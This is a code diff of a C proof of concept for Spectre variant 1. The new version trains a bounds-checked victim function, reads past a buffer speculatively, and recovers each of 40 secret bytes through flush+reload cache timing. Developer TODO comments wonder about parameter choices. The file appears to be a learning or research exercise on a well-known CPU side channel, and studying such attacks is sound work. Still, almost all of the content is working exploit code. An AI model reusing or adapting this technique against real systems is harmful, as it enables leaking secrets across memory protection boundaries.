@@ -3,22 +3,23 @@
 #include <malloc.h>
 #include <unistd.h>
 
-
 #define clflush(_addr) asm volatile("clflush (%0)" : : "r" (_addr));
+
 #define measure_time(_time, _addr) asm volatile(\
-	"mfence\n"\
-	"rdtscp\n"\
-	"mov %%rax, %%r10\n"\
-	"mov (%1), %%rcx\n"\
-	"rdtscp;\n"\
-	"sub %%r10, %%rax\n"\
-	: "=a"(_time)\
-	: "b"(_addr));
+				"mfence\n"\
+				"rdtscp\n"\
+				"mov %%rax, %%r10\n"\
+				"mov (%1), %%rcx\n"\
+				"rdtscp;\n"\
+				"sub %%r10, %%rax\n"\
+				: "=a"(_time)\
+				: "b"(_addr)\
+				: "rcx", "r10");
 
 #define clflush_array(_array)\
-	for (int i = 0; i < 256; i++)\
+	for (int j = 0; j < 256; j++)\
 	{\
-		clflush(&_array[i * 4096 + DELTA]);\
+		clflush(&_array[j * 4096]);\
 	};\
 	asm volatile("mfence");
 
@@ -27,245 +28,117 @@
 #define CACHE_HIT_THRESHOLD 120
 #define ITERATION 100
 
-
-
-int global_Array_Size = 30;
-int bufferSize = 10;
-uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+uint8_t temp = 0;
+int bufferSize = 16;
+// TODO
+// If we declare buffer size as 16 instead of 16, it works, but with lower resolution
+// WHY?
+uint8_t buffer[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
+// TODO
+// If the secret is short, like below, Spectre won't work! WHY?
+// char secret[] = "It's the secret.";
 // unreachable but known address
-char secret[] = "It's the secret";
+char secret[] = "The Magic Words are Squeamish Ossifrage.";
 
 
-int findHighestHit(int* measurements){
-	// find highest
-	int highestIndex = 0;
-	for (int i = 0; i < 256; i++)
-	{
-		if(measurements[i] > measurements[highestIndex]){
-			highestIndex = i;
-		}
-	}
-	return highestIndex;
-}
 
-/**
- * Access to the secret element multiple times 
- * 
-*/ 
-void find_cache_hit_predefined_secret(uint8_t* array, int secret){
-
-	int measurements[256];
-	for (int i = 0; i < 256; i++)
-	{
-		measurements[i] = 0;
-	}
-	
-	// do multiple measurements
-	for (int it = 0; it < ITERATION; it++)
-	{
-		// access
-		array[secret * 4096 + DELTA] = 12;
-
-		for (int i = 0; i < 256; i++)
-		{
-			uint64_t time_dif = 0;
-			measure_time(time_dif, &array[i * 4096 + DELTA]);
-
-			if(time_dif < CACHE_HIT_THRESHOLD){
-				measurements[i]++;
-				break;
-			}
-		}
-		clflush_array(array);
-	}
-
-	
-	printf("Highest index:%d\n",findHighestHit(measurements));
-}
-
-void victim1(size_t x, uint8_t* array){
-	if(x < global_Array_Size){
-		// in bounds
-		int temp = array[x * 4096 + DELTA];
-	}
-}
-
-/**
- * Train victim. Then access to out of bounds
- * Cache that value
- * 
-*/ 
-void find_cache_hit_spectre1(uint8_t* array){
-	
-	int upperlimit = 1000;
-	while(upperlimit)
-	{
-		int measurements[256];
-		for (int i = 0; i < 256; i++)
-		{
-			measurements[i] = 0;
-		}
-
-		// do multiple measurements
-		for (int it = 0; it < ITERATION; it++)
-		{
-			// train victim
-			for (int i = 0; i < 20; i++)
-			{
-				clflush(&global_Array_Size);
-				victim1(i, array);
-			}
-
-			clflush(&global_Array_Size);
-			clflush_array(array);
-
-			victim1(133, array);
-	
-			for (int i = 0; i < 256; i++)
-			{
-				uint64_t time_dif = 0;
-				measure_time(time_dif, &array[i * 4096 + DELTA]);
-
-				if(time_dif < CACHE_HIT_THRESHOLD){
-					measurements[i]++;
-					break;
-				}
-			}
-			clflush_array(array);
-		}
-		if(findHighestHit(measurements) != 0){
-			printf("Highest index:%d\n",findHighestHit(measurements));		
-			break;
-		}
-		// repeat
-		upperlimit--;
-	}
-}
-
-void victim_to_buffer(size_t x, uint8_t* array){
+void victim_function(uint8_t* array, size_t x){
 	if(x < bufferSize){
-		int temp = array[x * 4096 + DELTA];
+		// read the array's element to temp
+		temp &= array[buffer[x] * 4096];
 	}
 }
 
 /**
- * Finds accessed element in speculative execution 
-*/ 
-void find_accessed_element(uint8_t* array){
+ * Finds cached entry of the array
+ * Iterates over 256 entries to find latencies smaller than threshold
+ */
+void find_cached_index(uint8_t* array, int* scores){
 
-	int measurements[256];
+	uint64_t time_dif;
 	for (int i = 0; i < 256; i++)
 	{
-		measurements[i] = 0;
-	}
-	
-	for (int i = 0; i < 256; i++)
-	{
-		uint64_t time_dif = 0;
-		measure_time(time_dif, &array[i * 4096 + DELTA]);
-		
+		time_dif = 0;
+		measure_time(time_dif, &array[i * 4096]);
+
 		if(time_dif < CACHE_HIT_THRESHOLD){
-			measurements[i]++;
-			break;
+			scores[i]++;
 		}
 	}
-	int minIndex = 0;
-	int minValue = 300;
-	// find highest
-	for (int i = 0; i < 256; i++)
-	{
-		if(measurements[i] < minValue){
-			minValue = measurements[i];
-			minIndex = i;
-		}
-	}
-	printf("minIndex:%d\n", minIndex);
-	asm volatile("mfence");
 }
 
-void steal_1byte_secret(uint8_t* array){
-
-	int measurements[256];
-	for (int i = 0; i < 256; i++)
-	{
-		measurements[i] = 0;
-	}
-
-	int upperlimit = 1;
-	// do multiple measurements
-	while(upperlimit)
-	{
+/**
+ * Train the victim function
+ */
+void train_victim(uint8_t* array){
+	int i;
+	for (i = 0; i < 20; i++){
+		victim_function(array, i % 10);
 		clflush_array(array);
-		// train victim
-		for (int i = 0; i < 20; i++)
-		{
-			clflush(&bufferSize);
-			victim_to_buffer(i%9, array);
-			find_accessed_element(array);
-			clflush_array(array);
-		}
 		clflush(&bufferSize);
-		clflush_array(array);
-
-		// for out of bounds access
-		//size_t larger_x = (size_t)(secret - (char*)buffer);  
-		size_t larger_x = 18;
-		// access to the array
-		victim_to_buffer(larger_x, array);
-		
-
-		for (int i = 1; i < 256; i++)
-		{
-			uint64_t time_dif = 0;
-			measure_time(time_dif, &array[i * 4096 + DELTA]);
-			
-			if(time_dif < CACHE_HIT_THRESHOLD){
-				measurements[i]++;
-				break;
-			}
-		}
-		// repeat
-		upperlimit--;
 	}
-	/*
-	for (int i = 0; i < 256; i++)
-	{
-		printf("measurements[%d]:%d\n", i , measurements[i]);
-	}
-	*/
-	printf("Highest index:%d\n",findHighestHit(measurements));
 }
 
-int main(){
-
-	printf("Spectre is started\n");
-
-	uint8_t * array = (uint8_t *) malloc(4096 * 256 * sizeof(uint8_t));
-
-	for (int i = 0; i < 256 * 4096; i++)
+/**
+ * Finds highest score in the scores array
+ */
+void find_highest_score(int* scores){
+	int maxScore = 0;
+	int maxIndex = 0;
+	int i;
+	for (i = 1; i < 256; i++)
 	{
-		array[i] = i % 256;
+		if(scores[i] > maxScore){
+			maxIndex = i;
+			maxScore = scores[i];
+		}
 	}
+	printf("Letter: %c\t Index: %d\t number of hits:%d\n", maxIndex, maxIndex, maxScore);
+}
+
+/**
+ * Reads one byte from the out of bounds of the buffer
+ */
+void steal_byte(uint8_t* array, int byteindex){
 
 	clflush_array(array);
-	// TODO, DONT DELETE IT
 
-	/*
-	uint64_t time_dif1 = 0;
-	uint64_t time_dif2 = 0;
-	uint64_t time_dif3 = 0;
-	
-	// 0 and 40 are the same. 41 is different. WHY?
-	measure_time(time_dif1, &array[0]);
-	measure_time(time_dif2, &array[40]);
-	measure_time(time_dif3, &array[41]);
-	*/
+	// out of bounds access
+	size_t larger_x = (size_t)(secret - (char*)buffer + byteindex);
 
-	
-	//find_cache_hit_predefined_secret(array, 93);
-	
-	//find_cache_hit_spectre1(array);
+	// initialize scores
+	int* scores =(int*) malloc(256 * sizeof(int));
+	for (int i = 0; i < 256; i++)
+	{
+		scores[i] = 0;
+	}
 
-	steal_1byte_secret(array);
+	// do the experiment 1000 Times
+	for(int it = 0; it < 1000; it++){
+
+		train_victim(array);
+		// access to the array speculatively
+		victim_function(array, larger_x);
+
+		find_cached_index(array, scores);
+	}
+	find_highest_score(scores);
+	free(scores);
+}
+
+
+int main(){
+	uint8_t * array = (uint8_t *) malloc(4096 * 256 * sizeof(uint8_t));
+
+	// initialize the array
+	for (int i = 0; i < 256 * 4096; i++){
+		array[i] = i % 256;
+	}
+	// steal the secret, secret is 40 byte long
+	for(int i =0; i < 40; i++){
+		steal_byte(array, i);
+	}
+
+	free(array);
 	return 0;
 }
